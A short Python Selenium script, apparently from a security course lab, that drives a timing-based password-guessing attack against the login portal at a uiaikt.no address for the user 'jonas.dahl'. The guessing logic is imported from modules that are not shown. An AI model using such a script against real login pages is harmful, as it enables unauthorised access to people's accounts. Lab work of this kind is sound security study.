# https://stackoverflow.com/questions/13166395/fill-input-of-type-text-and-press-submit-using-python
from selenium import webdriver
from timing import get_password_length
from find_password import find_password

# Ensure you have the correct path to your ChromeDriver executable
chrome_driver_path = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'
driver = webdriver.Chrome()

webpage = "https://portal.regjeringen.uiaikt.no/"  # Edit the URL
driver.get(webpage)

username = "jonas.dahl"

password_length = get_password_length(driver, username, 100, .1)
find_password(driver, username, password_length)

# Close the browser window
driver.quit()
